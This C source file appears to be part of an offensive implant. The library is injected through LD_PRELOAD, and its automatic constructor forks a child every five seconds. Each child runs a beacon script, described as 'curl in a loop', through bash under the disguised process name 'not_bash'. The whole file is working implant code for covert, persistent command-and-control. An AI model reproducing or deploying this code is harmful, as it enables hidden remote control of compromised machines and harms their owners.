/*
 * dishonest_cheese_thread.c
 * Injecty curl in a loop
 * By J. Stuart McMurray
 * Created 20251031
 * Last Modified 20251102
 */

#include <err.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

#include "beacon.h"

#define INTERVAL  (5) /* Beacon interval in seconds. */
#define SCRIPTVAR "DISHONEST_SOFT_CHEESE_SCRIPT"

/* ctor starts bot in a detached thread. */
static void __attribute__((constructor))
ctor(void)
{
        pid_t ret;

        /* Avoid self-forkbombs. */
        if (-1 == unsetenv("LD_PRELOAD")) {
                warn("unsetenv");
                return;
        }

        /* Add our script to the environment, for the children's sake. */
        if (-1 == setenv(SCRIPTVAR, BEACON_SH, 1)) {
                warn("setenv");
                return;
        }

        /* Don't wait for children. */
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN)) {
                warn("signal");
                return;
        }

        /* Beacon every so often. */
        for (;;) {
                /* Fork a child. */
                if (-1 == (ret = fork())) {
                        warn("fork");
                        return;
                } else if (0 != ret) {
                        /* Parent, wait a bit and fork another one. */
                        sleep(INTERVAL);
                        continue;
                }
                /* Child, exec a shell to run our script. */
                execl("/bin/bash", "not_bash", "-c",
                                "eval \"$"SCRIPTVAR"\"", NULL);
                err(10, "execl");
        }
}
